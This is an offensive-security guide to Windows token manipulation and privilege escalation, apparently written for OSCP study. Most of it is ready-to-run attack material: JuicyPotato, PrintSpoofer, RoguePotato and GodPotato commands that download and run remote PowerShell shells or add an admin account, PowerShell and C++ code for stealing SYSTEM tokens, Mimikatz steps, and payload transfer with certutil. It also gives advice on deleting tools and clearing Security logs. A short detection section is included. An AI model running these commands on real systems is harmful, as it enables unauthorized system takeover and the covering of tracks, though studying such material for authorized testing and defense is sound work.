# Windows Token Manipulation & Privilege Abuse

Complete guide for exploiting Windows access tokens and privileges - essential for privilege escalation.

---

## Table of Contents
1. [Token Fundamentals](#1-token-fundamentals)
2. [SeImpersonatePrivilege Abuse](#2-seimpersonateprivilege-abuse)
3. [SeDebugPrivilege Exploitation](#3-sedebugprivilege-exploitation)
4. [Token Theft & Duplication](#4-token-theft--duplication)
5. [Named Pipe Impersonation](#5-named-pipe-impersonation)
6. [Parent Process Spoofing](#6-parent-process-spoofing)
7. [Detection & Defense](#7-detection--defense)

---

## 1. Token Fundamentals

### 1.1 What is an Access Token?

**Definition:**
- Security context for processes/threads
- Contains user SID, group memberships, privileges
- Determines access rights to objects

**Token Types:**
- **Primary Token**: Associated with process
- **Impersonation Token**: Associated with thread (temporary)

---

### 1.2 Token Structure

```
Access Token:
├── User SID
├── Group SIDs
├── Privileges
│   ├── SeDebugPrivilege
│   ├── SeImpersonatePrivilege
│   ├── SeAssignPrimaryTokenPrivilege
│   └── ...
├── Owner
├── Primary Group
├── Default DACL
├── Token Source
└── Token Type (Primary/Impersonation)
```

---

### 1.3 Check Current Privileges

**CMD:**
```cmd
whoami /priv
```

**PowerShell:**
```powershell
Get-Process -Id $PID | Select-Object -ExpandProperty Handles
whoami /priv
```

**Output:**
```
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                          State
============================= ==================================== ========
SeImpersonatePrivilege        Impersonate a client after auth      Enabled
SeDebugPrivilege              Debug programs                       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
```

---

## 2. SeImpersonatePrivilege Abuse

### 2.1 Understanding SeImpersonatePrivilege

**Who Has It:**
- Local Service
- Network Service
- IIS AppPool accounts
- SQL Server service accounts
- Any service running as specific user

**What It Allows:**
- Impersonate any token the process can obtain
- Escalate to SYSTEM via token manipulation

---

### 2.2 Potato Exploits (Overview)

**Evolution:**
```
Hot Potato (2016)
  ↓
Rotten Potato (2017)
  ↓
Juicy Potato (2018)
  ↓
Rogue Potato (2020)
  ↓
PrintSpoofer (2020)
  ↓
GodPotato (2022)
```

---

### 2.3 JuicyPotato (Windows Server 2016/2019)

**Theory:**
- Abuse DCOM/RPC to trigger SYSTEM authentication
- Intercept SYSTEM token
- Create process as SYSTEM

**Check CLSID:**
```cmd
# Different CLSIDs for different Windows versions
# Windows Server 2019: {e60687f7-01a1-40aa-86ac-db1cbf673334}
# Windows 10 1809: {4991d34b-80a1-4291-83b6-3328366b9097}
```

**Usage:**
```cmd
# Test (whoami)
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *

# Get SYSTEM shell
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\Temp\reverse.exe" -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}

# Add admin user
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net user hacker P@ssw0rd /add && net localgroup administrators hacker /add" -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

**Parameters:**
- `-l`: COM server listen port
- `-p`: Program to launch
- `-a`: Arguments
- `-t`: CreateProcess call type (* = auto)
- `-c`: CLSID

---

### 2.4 PrintSpoofer (Windows 10/11, Server 2019+)

**Why PrintSpoofer:**
- JuicyPotato doesn't work on Windows 10 1809+
- Uses Print Spooler service instead of DCOM

**Usage:**
```cmd
# Get SYSTEM shell
PrintSpoofer.exe -i -c cmd

# Execute command
PrintSpoofer.exe -c "whoami"

# Reverse shell
PrintSpoofer.exe -c "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.100/shell.ps1')"

# Add user
PrintSpoofer.exe -c "net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"
```

**Get proof.txt:**
```cmd
PrintSpoofer.exe -c "cmd /c type C:\Users\Administrator\Desktop\proof.txt"
```

---

### 2.5 RoguePotato (Windows 10 1809+)

**Theory:**
- Redirect OXID resolution to attacker-controlled server
- Intercept SYSTEM authentication

**Requirements:**
- SeImpersonatePrivilege
- Redirector on attacker machine

**Setup:**
```bash
# On attacker (Kali)
sudo socat tcp-listen:135,reuseaddr,fork tcp:TARGET_IP:9999
```

**On Target:**
```cmd
RoguePotato.exe -r 10.10.10.100 -e "C:\Temp\reverse.exe" -l 9999
```

---

### 2.6 GodPotato (Latest - 2022+)

**Advantages:**
- Works on latest Windows 10/11
- No external dependencies
- Local exploitation only

**Usage:**
```cmd
# Execute command as SYSTEM
GodPotato.exe -cmd "cmd /c whoami"

# Reverse shell
GodPotato.exe -cmd "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.100/rev.ps1')"
```

---

### 2.7 Choosing the Right Potato

**Decision Tree:**
```
Windows Server 2016/2019 → JuicyPotato
Windows 10 1809 - 1903   → RoguePotato
Windows 10 1909+         → PrintSpoofer or GodPotato
Windows 11               → GodPotato
```

---

## 3. SeDebugPrivilege Exploitation

### 3.1 Understanding SeDebugPrivilege

**What It Allows:**
- Open any process (including SYSTEM processes)
- Read/write process memory
- Inject code into any process

**Who Has It:**
- Administrators (by default, but disabled)

---

### 3.2 Enable SeDebugPrivilege

**PowerShell:**
```powershell
# Enable privilege
function Enable-Privilege {
    param([string]$Privilege)

    $definition = @'
    using System;
    using System.Runtime.InteropServices;
    public class AdjPriv {
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
            ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);

        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);

        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct TokPriv1Luid {
            public int Count;
            public long Luid;
            public int Attr;
        }

        internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
        internal const int TOKEN_QUERY = 0x00000008;
        internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;

        public static bool EnablePrivilege(long processHandle, string privilege) {
            bool retVal;
            TokPriv1Luid tp;
            IntPtr hproc = new IntPtr(processHandle);
            IntPtr htok = IntPtr.Zero;
            retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
            tp.Count = 1;
            tp.Luid = 0;
            tp.Attr = SE_PRIVILEGE_ENABLED;
            retVal = LookupPrivilegeValue(null, privilege, ref tp.Luid);
            retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            return retVal;
        }
    }
'@

    $processHandle = (Get-Process -Id $PID).Handle
    $type = Add-Type $definition -PassThru
    $type[0]::EnablePrivilege($processHandle, $Privilege)
}

Enable-Privilege -Privilege "SeDebugPrivilege"
whoami /priv  # Verify it's now Enabled
```

---

### 3.3 Steal SYSTEM Token (Mimikatz)

**Mimikatz:**
```
privilege::debug
token::elevate
token::list
```

**Get SYSTEM shell:**
```
privilege::debug
token::elevate /domainadmin
# Now you're SYSTEM or Domain Admin
```

---

### 3.4 Process Injection with SeDebugPrivilege

**PowerShell:**
```powershell
# Find SYSTEM process (e.g., lsass.exe)
Get-Process lsass

# Inject shellcode
# (Use process injection techniques from process_injection_techniques.md)
```

---

## 4. Token Theft & Duplication

### 4.1 Stealing SYSTEM Token

**Theory:**
1. Open SYSTEM process (e.g., winlogon.exe, lsass.exe)
2. Get process token
3. Duplicate token
4. Create new process with stolen token

**PowerShell Implementation:**
```powershell
# Requires SeDebugPrivilege

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Tokens {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes,
        int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpApplicationName,
        string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
        IntPtr lpStartupInfo, out IntPtr lpProcessInformation);
}
"@

# Get SYSTEM process
$systemProc = Get-Process winlogon | Select-Object -First 1

# Open process token
$hToken = [IntPtr]::Zero
[Tokens]::OpenProcessToken($systemProc.Handle, 0x02000000, [ref]$hToken)

# Duplicate token
$hDupToken = [IntPtr]::Zero
[Tokens]::DuplicateTokenEx($hToken, 0x02000000, [IntPtr]::Zero, 2, 1, [ref]$hDupToken)

# Create process as SYSTEM
# (CreateProcessWithTokenW implementation)
```

---

### 4.2 Incognito (Meterpreter)

**Metasploit:**
```
meterpreter > use incognito
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
NT AUTHORITY\SYSTEM
CORP\Administrator
CORP\sqlsvc

meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

## 5. Named Pipe Impersonation

### 5.1 Theory

**How It Works:**
1. Create named pipe
2. Trick SYSTEM service to connect
3. Impersonate connecting client
4. Get SYSTEM token

---

### 5.2 PrintSpoofer Method

**Already covered in Section 2.4** - PrintSpoofer uses named pipe impersonation internally.

---

### 5.3 Custom Named Pipe Impersonation

**C++ Implementation:**
```cpp
#include <windows.h>
#include <stdio.h>

int main() {
    // Create named pipe
    HANDLE hPipe = CreateNamedPipe(
        "\\\\.\\pipe\\evilpipe",
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        1,
        0x1000,
        0x1000,
        0,
        NULL
    );

    // Wait for client connection (SYSTEM service)
    ConnectNamedPipe(hPipe, NULL);

    // Impersonate client
    ImpersonateNamedPipeClient(hPipe);

    // Now running as SYSTEM
    STARTUPINFO si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    CreateProcessWithTokenW(
        // ... (create cmd.exe as SYSTEM)
    );

    return 0;
}
```

---

## 6. Parent Process Spoofing

### 6.1 PPID Spoofing for Privilege Escalation

**Already covered in advanced_evasion.md**, but here's the privilege escalation context:

**Scenario:**
- You have user access
- Find SYSTEM process (e.g., services.exe)
- Spoof your new process to appear as child of SYSTEM process
- Bypass security checks

---

## 7. Detection & Defense

### 7.1 Blue Team Detection

**Event IDs:**
- **4672**: Special privileges assigned to new logon (SeDebugPrivilege, SeImpersonatePrivilege)
- **4673**: Sensitive privilege use
- **4688**: Process creation (look for unusual parent-child relationships)

**Sysmon:**
- Event ID 10: ProcessAccess (OpenProcess with suspicious privileges)
- Event ID 1: Process creation (unusual command lines)

**Indicators:**
- JuicyPotato.exe, PrintSpoofer.exe in process list
- cmd.exe spawned from unusual services
- Token manipulation API calls (OpenProcessToken, DuplicateTokenEx)

---

### 7.2 Blue Team Mitigations

**Remove SeImpersonatePrivilege:**
```
Not recommended - breaks services
```

**Patch Systems:**
```
Windows Updates close DCOM/RPC vulnerabilities
```

**Monitor:**
```
Alert on:
- SeImpersonatePrivilege usage from non-service accounts
- SeDebugPrivilege enabled
- Named pipe creation with suspicious names
```

---

### 7.3 Red Team OPSEC

**Avoid Detection:**
```powershell
# Don't drop executables
# Use PowerShell-based methods

# Example: PowerShell token theft (in-memory)
# (Use Invoke-TokenManipulation.ps1 from PowerSploit)
```

**Clean Up:**
```cmd
# Remove executables after use
del JuicyPotato.exe
del PrintSpoofer.exe

# Clear logs (risky!)
wevtutil cl Security
```

---

## 8. OSCP Practical Guide

### 8.1 Quick Decision Tree

```
Have shell as service account?
  ↓
whoami /priv
  ↓
SeImpersonatePrivilege enabled?
  ↓ YES
Check Windows version
  ↓
Server 2016/2019 → JuicyPotato
Windows 10 1809+  → PrintSpoofer
Windows 11        → GodPotato
```

### 8.2 OSCP Workflow

**Step 1: Check Privileges**
```cmd
whoami /priv
```

**Step 2: Transfer Tool**
```powershell
# On Kali
python3 -m http.server 80

# On Windows
certutil -urlcache -f http://10.10.10.100/PrintSpoofer.exe C:\Temp\PrintSpoofer.exe
```

**Step 3: Execute**
```cmd
cd C:\Temp
PrintSpoofer.exe -i -c cmd
whoami
# NT AUTHORITY\SYSTEM

# Get proof.txt
type C:\Users\Administrator\Desktop\proof.txt
```

---

### 8.3 Common Scenarios

**IIS AppPool:**
```
User: IIS APPPOOL\DefaultAppPool
Privilege: SeImpersonatePrivilege → PrintSpoofer
```

**SQL Server:**
```
User: MSSQLSERVER service account
Privilege: SeImpersonatePrivilege → JuicyPotato or PrintSpoofer
```

**Local Service:**
```
User: NT AUTHORITY\LOCAL SERVICE
Privilege: SeImpersonatePrivilege → PrintSpoofer
```

---

## 9. Tools Summary

| Tool | Windows Version | Privilege Required | Detection Risk |
|------|-----------------|-------------------|----------------|
| **JuicyPotato** | Server 2016-2019 | SeImpersonatePrivilege | Medium |
| **PrintSpoofer** | 10/11, Server 2019+ | SeImpersonatePrivilege | Low |
| **GodPotato** | 10/11 (latest) | SeImpersonatePrivilege | Low |
| **RoguePotato** | 10 1809+ | SeImpersonatePrivilege | Medium |
| **Mimikatz** | All | SeDebugPrivilege | High |
| **Incognito** | All (Metasploit) | SeImpersonatePrivilege | Medium |

---

## 10. References
- Red Team Notes: https://www.ired.team/offensive-security/privilege-escalation/t1134-access-token-manipulation
- MITRE ATT&CK: T1134 (Access Token Manipulation)
- Potato Exploits: https://github.com/ohpe/juicy-potato
- PrintSpoofer: https://github.com/itm4n/PrintSpoofer

---

## 11. Cheat Sheet

**Quick Commands:**
```cmd
# Check privileges
whoami /priv

# JuicyPotato (Server 2016-2019)
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c C:\reverse.exe" -t * -c {CLSID}

# PrintSpoofer (Windows 10+)
PrintSpoofer.exe -i -c cmd

# GodPotato (Windows 11)
GodPotato.exe -cmd "cmd /c whoami"

# Mimikatz (SeDebugPrivilege)
privilege::debug
token::elevate
```

---

**OSCP Exam Note:** PrintSpoofer is your best friend. Have it ready on your attacking machine. SeImpersonatePrivilege = instant SYSTEM in most cases.
